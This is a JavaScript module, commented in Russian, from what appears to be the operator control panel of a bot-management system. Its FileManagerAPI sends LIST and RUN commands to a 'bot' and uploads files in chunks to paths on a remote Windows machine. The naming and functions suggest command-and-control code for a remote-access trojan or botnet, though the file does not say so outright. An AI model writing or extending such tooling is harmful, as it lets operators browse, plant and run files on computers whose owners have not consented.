// frontend/client_control/js/modules/features/fm/FileManagerAPI.js

/**
 * API для работы с файлами. 
 * Реализовано строго по формулам протокола FileManager.
 */
export const FileManagerAPI = {
  send: (action, path = "") => {
    // 1. Определяем "чистую" команду для бота
    // Если пришло 'list_drives' или 'open', для бота это всегда 'LIST'
    const isNavigation = ['LIST', 'list_drives', 'open'].includes(action);
    const protocolAction = isNavigation ? 'LIST' : action.toUpperCase();

    // 2. Определяем путь. Если пусто — отправляем "Computer" или пустую строку
    let targetPath = (path === "Computer" || !path || action === 'list_drives') ? "" : path;

    // 3. Формируем payload. 
    // ВАЖНО: Для LIST бот не ждет payload, но мы можем передать пустой объект,
    // чтобы sendToBot распознал это как 'json' тип пакета.
    const payload = {}; 

    console.log(`[API] Отправка: Модуль=FileManager, Действие=${protocolAction}, Путь=${targetPath}`);
    
    if (window.sendToBot) {
        // Вызываем согласно сигнатуре в connection.js:
        // sendToBot(modName, pay, action, extra)
        window.sendToBot(
            'FileManager',   // modName
            payload,         // pay (пустой объект заставит софт поставить type: "json")
            protocolAction,  // action (LIST, RUN, etc)
            targetPath       // extra (наш путь)
        );
    }
  },

  /**
   * 3. ЗАГРУЗКА НА БОТ (UT - Upload Transfer)
   * Формула: UT_START (int) -> UT_DATA (bin)
   * 
   * @param {File} file - Объект файла из браузера
   * @param {string} currentPath - Текущая папка в проводнике
   */
  upload: async (file, currentPath) => {
    const CHUNK_SIZE = 65536; // 64 КБ на чанк
    const wait = ms => new Promise(r => setTimeout(r, ms));
    
    // Формируем корректный путь для Windows
    let cleanPath = (currentPath === "Computer" || !currentPath) ? "" : currentPath;
    if (cleanPath && !cleanPath.endsWith('\\') && !cleanPath.endsWith('/')) {
        cleanPath += '\\';
    }
    const fullRemotePath = cleanPath + file.name;

    console.log(`[UT] Начинаю загрузку: ${file.name} (Размер: ${file.size} байт)`);

    /**
     * ШАГ 1: Анонс размера (UT_START)
     * Формула: Тип "int", payload - размер файла.
     */
    window.sendToBot?.('FileManager', file.size, 'int', 'UT_START', fullRemotePath);
    
    // Небольшая пауза, чтобы бот успел создать файл на диске
    await wait(300); 

    /**
     * ШАГ 2: Передача данных (UT_DATA) по частям
     */
    let offset = 0;
    while (offset < file.size) {
        const chunk = await file.slice(offset, offset + CHUNK_SIZE).arrayBuffer();
        
        // Формула: Тип "bin", payload - байты (Uint8Array)
        window.sendToBot?.(
            'FileManager', 
            new Uint8Array(chunk), 
            'bin', 
            'UT_DATA', 
            fullRemotePath
        );
        
        offset += CHUNK_SIZE;
        
        // Пауза 10мс, чтобы не "забить" сетевой канал
        await wait(10); 
    }
    
    console.log(`[UT] Файл успешно отправлен: ${file.name}`);
  }
};